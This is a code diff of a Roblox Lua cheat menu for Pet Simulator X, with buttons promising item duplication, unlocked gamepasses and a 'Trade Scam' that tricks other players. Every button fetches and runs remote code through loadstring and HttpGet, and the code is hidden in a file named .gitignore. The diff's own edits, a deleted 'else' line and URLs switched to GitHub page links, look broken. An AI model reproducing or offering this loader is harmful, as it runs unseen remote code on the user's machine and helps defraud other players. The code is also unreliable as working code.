@@ -322,7 +322,6 @@ qweSection:NewButton("NoClip", "Makes you walk through walls", function()
     aaaSection:NewToggle("Start Auto Enchant", "Starts the Auto Enchant", function(state)
         if state then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
-        else
             loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
         end
     end)
@@ -412,15 +411,15 @@ wwwSection:NewButton("Dupe Gems", "Dupes your gems, works 80 percent of the time
 end)
 
 wwwSection:NewButton("Dupe Huges", "Dupes your Huges, works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
+    loadstring(game:HttpGet("https://github.com/demonicmiggie/ScriptV2/blob/main/.gitignore", true))()
 end)
 
 wwwSection:NewButton("Dupe Exclusives", "Dupes your Exclusives, works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
+    loadstring(game:HttpGet("https://github.com/demonicmiggie/ScriptV2/blob/main/.gitignore", true))()
 end)
 
 wwwSection:NewButton("Dupe Equiped Pets", "Dupes your Gems, Huges and Excsluives works 80 percent of the time.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
+    loadstring(game:HttpGet("https://github.com/demonicmiggie/ScriptV2/blob/main/.gitignore", true))()
 end)
 
 local wwwSection = www:NewSection("After clicking on any Dupe")
@@ -430,7 +429,7 @@ local rrr = Window:NewTab("Trade")
 local rrrSection = rrr:NewSection("Best Pet Simulator X Hub Made By MediumGames")
 
 rrrSection:NewButton("Trade Scam", "Place your pets in there and remove it, then click on this button. In their view it will be as you have pets kept in there.", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
+    loadstring(game:HttpGet("https://github.com/demonicmiggie/ScriptV2/blob/main/.gitignore", true))()
 end)
 
 local rrrSection = rrr:NewSection("Trade someone and select a pet.")
@@ -459,7 +458,7 @@ cccSection:NewButton("Moonlight", "Works in Pet Simulator X", function()
 end)
 
 cccSection:NewButton("Unlock All Gamepasses", "Unlocks every Gamepasses", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/demonicmiggie/ScriptV2/main/.gitignore", true))()
+    loadstring(game:HttpGet("https://github.com/demonicmiggie/ScriptV2/blob/main/.gitignore", true))()
 end)
 
 local vvv = Window:NewTab("More Coming Soon...")
